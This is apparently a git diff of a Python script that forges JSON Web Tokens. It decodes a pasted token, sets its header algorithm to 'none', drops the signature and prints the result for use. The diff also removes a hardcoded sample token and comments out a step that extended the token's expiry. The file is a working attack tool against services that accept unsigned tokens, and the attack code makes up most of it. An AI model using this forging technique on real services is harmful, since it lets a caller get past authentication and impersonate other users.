@@ -1,12 +1,10 @@
 import base64
 import json
 
-#insert JWT_TOKEN here
-JWT_TOKEN = "eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCIsImtpZCI6IjUxNGJjOGU0LTFlYzItNGMwNS1hMTJkLWNhOTViZmNlZjFjNF9zaWdfcnM1MTIifQ.eyJpc3MiOiJodHRwczovL2NocmlzLmdsdXVsb2NhbC5vcmcvb3hhdXRoL3Bvc3Rsb2dpbi5odG0iLCJzdWIiOiJ0ZXN0ZXIxIiwiYXVkIjoiMTUwMi5hODNkODdjOC0yYTU2LTQ2MWItOGEwMS01ZGY2YTE2ZDhlYTgiLCJqdGkiOiJlNTllZmJiMy04MWM5LTQ1NjktYmZiYi1lM2Y1NzhiZWQzZWUiLCJleHAiOjE1ODk0MTIzMjYuNDIsImlhdCI6MTU4OTQxMjI5NjQyMCwiZGF0YSI6InVaRll4UXA1S200TDVSczgzR3dhUnU4WDJWdXJmRkkxVGJXMlZCNk9uSE8zOFdFZGxybGtrd2VLaWh1MTk5cyt6RDhHdFYrTXFjbkJCZEVnTTZjK1lCZHJ6ZlBINFhYQUdwOWtCK0NlcVVUUFBweXBKREIyRnZUb2NacEp5ck9BQTVDVWZpbi9rdmxORUtIbG5QZTJ6SUtBa2Y4RVpaVkhYZFFoRjFGYlFoM2xHaVNoVndaeVN2Q3RRM3ljbENuZ29rYlJtVEVuUXl3K2pVZUZHc2ozK3c9PSJ9.wGR6-xOR4SwDdtBSWMCzpn6999bBrguVl3_acs1ocnGeh3hqYJVNhB3uv4TRf4fQs_1kIOGte1Syh42ORHXa17OIf_z7_OSV7oJM9zgk5vP9o-60G2a10HzCtJ10UQuOl_h_AiJGqOIme-QtJrM2cME3NiL9Dr3GA-vkEnhD5scPq8oKyKNiUQKUBMc_86AhXMpASHs58wPeY1gmgPM63K9IMFusK0Eh2TRNn3cY0A1FBCrPXNDQhyD5rzMIlMmqFFo4CfuAhYx6jDQuuYBGaqBvimr7pLapzfZ6Fdnqikfusacb14f6SoHsCSXfxBFUR0b_tqkdY0BCdA7yj8J0JQ"
-print("HI")
 
-
-
+JWT_TOKEN = ""
+print("Paste your JWT Token down here:")
+JWT_TOKEN = input()
 
 class Jwt:
     encoded_header = ""
@@ -22,7 +20,7 @@ class Jwt:
         # setting encoded vars
         self.slice_jwt()
         self.decode_jwt()
-        print("Decoded new JWT:")
+        print("Decoded JWT:")
         print(self.decoded_header)
         print(self.decoded_payload)
 
@@ -95,15 +93,19 @@ jwt.encoded_header = jwt.encode64(new_header)
 
 
 
-print("encoded_header")
+print("encoded_header: ")
 print(jwt.encoded_header)
-print("encoded_payload")
+print("encoded_payload: ")
 print(jwt.encoded_payload)
 
+print()
+print()
+print("HERE IS YOUR alg=\'none\' and without signature token:")
 
-print("lets merge")
-# print(jwt.encoded_header + "." + jwt.encoded_payload + ".")
+print(jwt.encoded_header + "." + jwt.encoded_payload + ".")
 
+
+'''
 #def change_exp_key():
 # increments +1 second digit if not "."
 exp = jwt.get_key_value(jwt.decoded_payload,'exp')
@@ -111,14 +113,14 @@ exp = jwt.get_key_value(jwt.decoded_payload,'exp')
 
 
 print("old exp = %s" % exp)
-'''
+
 exp = str(exp)
 if exp[1] != ".":
     exp[1] = str(int(exp[1])+1)
 else:
     exp[2] = str(int(exp[1])+1)
 
-'''
+
 exp += 100000000
 print("new exp = %s" % exp)
 
@@ -128,6 +130,9 @@ jwt.encoded_payload = jwt.encode64(new_payload)
 cracked_jwt = (jwt.encoded_header + "." + jwt.encoded_payload[:-2] + ".") #remove encoded_payload "=="
 print("USE THIS JWT:")
 print(cracked_jwt)
+'''
+
+
 
 
 
